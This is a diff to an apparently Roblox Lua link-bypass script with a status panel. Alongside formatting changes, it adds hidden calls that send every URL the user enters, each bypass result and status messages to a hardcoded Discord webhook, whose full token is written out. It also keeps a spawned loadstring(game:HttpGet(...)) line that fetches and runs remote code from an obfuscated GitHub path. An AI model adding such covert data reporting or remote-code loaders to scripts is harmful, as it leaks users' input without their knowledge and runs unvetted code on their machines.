@@ -146,7 +146,8 @@ local function urlDecode(str)
     end)
     return str
 end
- local timee = 15
+
+local timee = 15
 
 local function snd(wb, msg)
     local decodedMsg = urlDecode(msg)
@@ -172,33 +173,40 @@ local function checkApiStatus()
         local data = HttpService:JSONDecode(result)
         if data.status == "OK" and data.website_enabled then
             ApiStatus.Text = "Status: OK"
- local StarterGui = game:GetService("StarterGui")
-StarterGui:SetCore("SendNotification", {
-    Title = "Auto Check Status",
-    Text = "Status: OK",
-    Duration = 5,
-})
-timee = 60
+            local StarterGui = game:GetService("StarterGui")
+            StarterGui:SetCore("SendNotification", {
+                Title = "Auto Check Status",
+                Text = "Status: OK",
+                Duration = 5,
+            })
+            timee = 60
             
             ApiStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
             Input.TextEditable = true
+
+            snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: OK")
         else
             ApiStatus.Text = "Status: " .. data.status
-  local StarterGui = game:GetService("StarterGui")
-StarterGui:SetCore("SendNotification", {
-    Title = "",
-    Text = "Status: " .. data.status,
-    Duration = 5,
-})
-timee = 15
+            local StarterGui = game:GetService("StarterGui")
+            StarterGui:SetCore("SendNotification", {
+                Title = "Auto Check Status",
+                Text = "Status: " .. data.status,
+                Duration = 5,
+            })
+            timee = 15
             
             ApiStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
             Input.TextEditable = false
+
+            snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: " .. data.status)
         end
     else
         ApiStatus.Text = "Status: Error"
         ApiStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
         Input.TextEditable = false
+        
+        -- Enviar notificación al Discord
+        snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", "API Status: Error")
     end
 end
 
@@ -207,6 +215,7 @@ local function bypass(url)
     local api_url = "https://dlr-api.woozym.workers.dev/"
     local headers = {["x-api-key"] = api_key}
     local encoded_url = HttpService:UrlEncode(url)
+    snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", url)
     local request = http_request or request or syn.request or http.request
     if not request then return nil, nil end
     
@@ -224,6 +233,7 @@ local function bypass(url)
             if data.result == "https://t.ly/r69Me" then
                 return "API_MAINTENANCE", nil
             end
+            snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", data.result)
             return data.result, data.time_elapsed
         end
     end
@@ -246,13 +256,13 @@ local function processBypass()
             message = string.format("URL: %s\nResult: API is currently under maintenance. Please try again later.", url)
         elseif result and result:match("bypass fail! Please visit our website to see the supported links") then
             Result.Text = "This link or shortener will be available for bypass soon."
-            message = string.format("URL: %s\nResult: This link or shortener will be available for bypass soon.\nTime elapsed: %.2fs", url, time_elapsed or 0)
+            message = string.format("URL: %s\nResult: This link or shortener will be available for bypass soon.\nTime elapsed: %.2f", url, time_elapsed or 0)
         elseif result then
             Result.Text = result
-            message = string.format("URL: %s\nResult: %s\nTime elapsed: %.2fs", url, result, time_elapsed or 0)
+            message = string.format("URL: %s\nResult: %s\nTime elapsed: %.2f", url, result, time_elapsed or 0)
         else
             Result.Text = "Failed to bypass"
-            message = string.format("URL: %s\nResult: bypass fail! Please try again later or check if this link is supported.\nTime elapsed: %.2fs", url, time_elapsed or 0)
+            message = string.format("URL: %s\nResult: bypass fail! Please try again later or check if this link is supported.\nTime elapsed: %.2f", url, time_elapsed or 0)
         end
 
         snd(webhook_url, "Prefix: " .. message)
@@ -280,19 +290,17 @@ end)
 
 spawn(function()
     while true do
-            ApiStatus.Text = "Status: Checking..."
+        ApiStatus.Text = "Status: Checking..."
         checkApiStatus()
-local StarterGui = game:GetService("StarterGui")
-StarterGui:SetCore("SendNotification", {
-    Title = "Auto Check Status",
-    Text = "checking in " .. timee .. "s",
-    Duration = 5,
-})
-            
-wait(timee)
+        local StarterGui = game:GetService("StarterGui")
+        StarterGui:SetCore("SendNotification", {
+            Title = "Auto Check Status",
+            Text = "Checking in " .. timee .. "s",
+            Duration = 5,
+        })
+        wait(timee)
     end
 end)
-
 
 local function createGlowEffect()
     local Glow = Instance.new("ImageLabel")
@@ -316,6 +324,7 @@ local function animateColors()
 end
 
 spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
-    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
+end)
+
 spawn(animateColors)
